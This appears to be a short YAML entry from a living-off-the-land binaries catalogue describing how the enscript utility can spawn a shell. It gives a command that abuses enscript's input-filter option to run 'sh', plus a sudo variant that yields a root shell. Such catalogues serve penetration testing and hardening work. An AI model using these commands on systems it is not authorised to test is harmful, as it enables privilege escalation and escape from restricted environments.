---
functions:
  shell:
    - code: enscript /dev/null -qo /dev/null -I 'sh >&2'
      description: This can be useful when only a limited command argument injection is available.
  sudo:
    - code: sudo enscript /dev/null -qo /dev/null -I 'sh >&2'
---
